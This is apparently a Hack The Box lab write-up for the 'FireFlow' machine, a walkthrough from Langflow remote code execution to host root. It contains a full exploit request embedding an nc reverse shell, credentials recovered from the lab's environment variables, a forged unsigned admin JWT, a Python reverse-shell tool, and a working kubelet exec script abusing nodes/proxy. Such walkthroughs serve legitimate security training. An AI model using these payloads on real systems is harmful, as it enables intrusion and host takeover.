# FireFlow - Hack The Box Writeup

**Category:** Linux  
**Difficulty:** Medium

---

# Enumeration

## Nmap

Initial scan revealed only two exposed services.

```text
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
443/tcp open  ssl/http nginx
```

With very few ports exposed, I proceeded with web enumeration.

---

# Subdomain Enumeration

Subdomain enumeration revealed:

```text
flow.fireflow.htb
```

Visiting the subdomain showed that it was running **Langflow**.

The landing page also disclosed the version in use:

```text
Flow Engine 1.8.2
```

Since the application version was known, I searched for publicly disclosed vulnerabilities affecting this release.

---

# Identifying the Initial Attack Vector

Searching for vulnerabilities affecting Langflow 1.8.2 revealed:

```text
CVE-2026-33017 - Remote Code Execution
```

Reading through the advisory showed that exploitation requires:

- A valid **Public Flow ID**
- Either:
  - Authentication, or
  - `AUTO_LOGIN=true`

The first thing I checked was whether auto-login was enabled.

```bash
curl -s -k https://flow.fireflow.htb/api/v1/auto_login | jq
```

The response showed:

```text
AUTO_LOGIN = false
```

At first glance this appeared to block exploitation because authentication would normally be required.

---

# Finding a Public Flow

While exploring the application, I clicked the **Open Agent** button on the landing page.

Instead of requiring authentication, it immediately opened a public chat interface.

From the URL I obtained the public flow UUID:

```text
7d84d636-af65-42e4-ac38-26e867052c25
```

The application had also assigned my browser a client ID.

I retrieved it from Local Storage:

```text
8c201dc4-2ab3-4f7c-be3a-9144aef8c5d8
```

At this point I had everything needed to exploit the CVE without authenticating.

---

# Exploiting CVE-2026-33017

I used the public proof-of-concept from:

https://github.com/advisories/GHSA-vwmf-pq79-vjvx

First I started a web server to verify code execution.

```bash
python3 -m http.server 80
```

Then I modified the payload so that the vulnerable component would execute:

```python
import os

os.popen("curl http://10.10.15.101/test")
```

The exploit request was:

```bash
curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
-H "Content-Type: application/json" \
-b "client_id=8c201dc4-2ab3-4f7c-be3a-9144aef8c5d8" \
-d '<modified PoC payload>'
```

After sending the request, my HTTP server immediately received a connection.

This confirmed that **Remote Code Execution was successful.**

---

# Obtaining a Reverse Shell

After confirming RCE, I started a listener.

```bash
nc -lnvp 4444
```

I modified the payload to execute a reverse shell.

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | sh -i 2>&1 | nc 10.10.15.101 4444 >/tmp/f
```
Final command:
```bash
curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=8c201dc4-2ab3-4f7c-be3a-9144aef8c5d8" \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os, socket, json as _json\n\n_proof = os.popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.101 4444 >/tmp/f\").read().strip()\n_host = socket.gethostname()\n_write = open(\"/tmp/rce-proof\",\"w\").write(f\"{_proof} on {_host}\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    },
    "inputs": null
  }'
```
Executing the exploit again returned a shell as:

```text
www-data
```

---

# Local Enumeration

To identify local users I checked `/etc/passwd`.

```bash
cat /etc/passwd | grep sh
```

I discovered the user:

```text
nightfall
```

One of the first places I always check after obtaining a shell as a service account is the environment variables.

```bash
printenv
```

Among the variables I found:

```text
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```

Finding credentials inside environment variables is common for containerized applications, so I immediately attempted SSH access.

---

# SSH Access

Using the recovered credentials:

```text
Username: nightfall
Password: n1ghtm4r3_b4_n1ghtf4ll
```

I successfully authenticated via SSH.

---

# Discovering an Internal Service

Inside the user's home directory I discovered:

```text
/home/nightfall/.mcp/config.json
```

The configuration contained:

```json
{
  "server": "http://10.129.52.12:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Querying the version endpoint locally:

```bash
curl http://localhost:30080/api/v1/version
```

revealed:

```text
MCP AI Tool Registry
```

Since the service was only listening locally, I forwarded the port.

```bash
ssh nightfall@fireflow.htb -L 30080:127.0.0.1:30080
```

Now I could access it locally:

```text
http://127.0.0.1:30080
```

---

# JWT Misconfiguration

Visiting:

```text
http://127.0.0.1:30080/api/v1/version
```

revealed an extremely interesting detail.

```text
supported_algorithms

HS256
none
```

Allowing the **none** algorithm means JWT signature verification can potentially be bypassed.

If the application accepts unsigned JWTs, anyone who understands the token format can forge arbitrary identities.

This immediately became the next privilege escalation target.

---

# API Documentation

The Swagger documentation was available at:

```text
http://127.0.0.1:30080/docs
```

Using the interactive documentation simplified testing because it automatically generated properly formatted requests.

I authenticated using the credentials found in the configuration.

```text
langflow-bot
Langfl0w@mcp2026!
```

The generated request looked like:

```bash
curl -X POST \
"http://127.0.0.1:30080/api/v1/auth" \
-H "Content-Type: application/json" \
-d '{
  "username":"langflow-bot",
  "password":"Langfl0w@mcp2026!"
}'
```

The server returned a JWT.

```text
{
  "access_token":"<JWT>",
  "token_type":"bearer"
}
```

---

# Forging an Administrator JWT

While exploring the API documentation, I noticed that creating custom tools required an **administrator** role.

Since I already knew the server accepted the `none` algorithm, the obvious next step was to forge my own administrator token.

Decoding the JWT (without the signature) produced:

```json
{"alg":"HS256","typ":"JWT"}
{"sub":"langflow-bot","role":"user"}
```

I replaced the contents with:

Header:

```json
{"alg":"none","typ":"JWT"}
```

Payload:

```json
{"sub":"langflow-bot","role":"admin"}
```

After Base64 encoding both sections (without padding), I combined them in JWT format:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

Since the algorithm was `none`, no signature was required.

The forged token was accepted by the application.

---

# Creating a Malicious MCP Tool

With administrator privileges I could register arbitrary Python tools.

I created a new tool named:

```text
revshell
```

whose code established a reverse shell.

```python
import socket
import os
import pty

pid = os.fork()
if pid > 0:
    exit()

os.setsid()

pid = os.fork()
if pid > 0:
    exit()

s = socket.socket()
s.connect(("10.10.14.7",9001))

[os.dup2(s.fileno(), i) for i in (0,1,2)]

pty.spawn("/bin/sh")
```

The tool was uploaded using the API documentation which sent the following curl command:

```bash
curl -X 'POST' \
  'http://127.0.0.1:30080/api/v1/tools' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "revshell",
  "description": "string",
  "inputSchema": {
    "additionalProp1": {}
  },
  "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.14.7\",9001))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
}'
```

---

# Executing the Tool

The MCP service uses JSON-RPC 2.0.

I triggered the tool via:

```bash
curl -X POST \
"http://127.0.0.1:30080/mcp" \
-H "Authorization: Bearer <token>" \
-d '{
  "jsonrpc":"2.0",
  "method":"tools/call",
  "params":{
      "name":"revshell"
  }
}'
```

My listener received a shell as:

```text
mcp
```

---

# Kubernetes Enumeration

While exploring the environment, I noticed I was inside a Kubernetes pod.

The first thing I did was retrieve the service account token.

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://10.43.0.1:443
```

Next, I checked which permissions this service account possessed.

```bash
curl \
--cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json" \
-X POST \
-d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

The response showed an extremely interesting permission:

```text
get nodes/proxy
```

---

# Researching Kubernetes Privilege Escalation

Since `nodes/proxy` access is a well-known Kubernetes privilege escalation primitive, I searched for exploitation techniques.

I found an excellent reference:

https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9

I followed the same technique, but implemented it manually since the container lacked tools like `jq` and `websocat`.

---

# Determining the Node

Using the JWT payload, I extracted the node name.

```bash
echo $TOKEN | cut -d. -f2)==" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r '.["kubernetes.io"].node.name'
```
I had to copy the token and run this command in my kali linux machine as the pod didnt had 'jq' installed
Running this locally revealed:

```text
fireflow
```

---

# Finding Privileged Pods

Next I queried every pod running on the node and searched for privileged containers.

```bash
curl -sk \
-H "Authorization: Bearer $TOKEN" \
"https://kubernetes.default.svc/api/v1/nodes/fireflow/proxy/pods" \
| python3 -c '
import sys,json
data=json.load(sys.stdin)
[print(json.dumps(c,indent=2))
for pod in data.get("items",[])
for c in pod.get("spec",{}).get("containers",[])
if c.get("securityContext",{}).get("privileged")]
'
```

The output revealed:

```text
Pod:
prometheus-prometheus-node-exporter-nmntq

Container:
node-exporter
```

This container was running in privileged mode.

We know, the Kubernetes node was the same machine hosting the HTB target.

```text
10.129.52.12
```

That meant code execution inside the privileged pod would effectively provide access to the host.

---

# Achieving Node RCE

Since `websocat` was unavailable, I wrote a small Python implementation of the Kubernetes exec WebSocket protocol.

```python
# exploit.py
import socket,ssl,os,base64,struct,sys

token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
node_ip = '10.129.52.12'
pod = 'prometheus-prometheus-node-exporter-nmntq'
container = 'node-exporter'
namespace = 'monitoring'

if len(sys.argv) > 1:
    command = sys.argv[1]
else:
    command = 'id'

print(f"[+] Executing: {command}")

# Split command into parts and build parameters
cmd_parts = command.split()
args = "&".join(f"command={part}" for part in cmd_parts)

websocket_key = base64.b64encode(os.urandom(16)).decode()
handshake = f'GET /exec/{namespace}/{pod}/{container}?output=1&error=1&{args} HTTP/1.1\r\nHost: {node_ip}:10250\r\nAuthorization: Bearer {token}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: {websocket_key}\r\nSec-WebSocket-Protocol: v4.channel.k8s.io\r\nSec-WebSocket-Version: 13\r\n\r\n'

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((node_ip, 10250))
sock = ssl_context.wrap_socket(sock, server_hostname=node_ip)
sock.send(handshake.encode())

# Read only HTTP headers
response = b''
while b'\r\n\r\n' not in response:
    chunk = sock.recv(4096)
    if not chunk:
        break
    response += chunk

header_end = response.find(b'\r\n\r\n') + 4
headers = response[:header_end]
body = response[header_end:]

print(headers.decode(errors='ignore').strip())

if b'101' in headers:
    if body and len(body) > 1:
        print(body[1:].decode(errors='ignore'), end='')
    
    data = b'\x00\n'
    mask = os.urandom(4)
    frame = bytearray([0x82, 0x80 | len(data)]) + mask + bytes([data[i] ^ mask[i % 4] for i in range(len(data))])
    sock.send(frame)
    
    while 1:
        try:
            header = sock.recv(2)
            if not header or len(header) < 2:
                break
            length = header[1] & 0x7F
            if length == 126:
                length = struct.unpack('>H', sock.recv(2))[0]
            elif length == 127:
                length = struct.unpack('>Q', sock.recv(8))[0]
            if header[1] & 0x80:
                mask = sock.recv(4)
                data = b''
                for i in range(length):
                    data += bytes([sock.recv(1)[0] ^ mask[i % 4]])
            else:
                data = sock.recv(length)
            if data and len(data) > 1:
                print(data[1:].decode(errors='ignore'), end='')
        except:
            break
```

Running:

```bash
python3 exploit.py id
```

returned:

```text
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

This confirmed successful remote command execution as root inside the privileged container.

---

# Reading the Host Filesystem

Initially I considered obtaining another reverse shell.

However, before doing so I checked the filesystem layout.

```bash
python3 exploit.py ls
```

I noticed a mounted directory:

```text
/host
```

Inside it was the host filesystem.

That meant I didn't actually need another shell.

Instead, I simply read the host's root flag directly.

```bash
python3 exploit.py 'cat /host/root/root/root.txt'
```

The command returned the contents of:

```text
/root/root.txt
```

Root flag obtained.

---

# Lessons Learned

- Version disclosure can significantly simplify vulnerability research.
- Environment variables frequently contain sensitive credentials in containerized deployments.
- Allowing JWTs signed with the `none` algorithm completely breaks authentication.
- Swagger documentation is invaluable during API testing because it exposes endpoints and expected request formats.
- Kubernetes service account permissions should always be reviewed after compromising a pod.
- Even seemingly limited permissions such as `nodes/proxy` can lead to full cluster or host compromise.
- Privileged containers remain one of the most dangerous Kubernetes configurations.

---

**Personal Opinion:** This machine was an excellent modern attack chain combining AI infrastructure, JWT misconfigurations, Kubernetes privilege escalation, and container breakout techniques. I particularly enjoyed how every stage naturally led to the next—from exploiting Langflow, to abusing an unsigned JWT, to gaining access to the MCP service, and finally leveraging Kubernetes `nodes/proxy` permissions to reach the underlying host. It felt like attacking a modern production deployment rather than a collection of unrelated vulnerabilities.
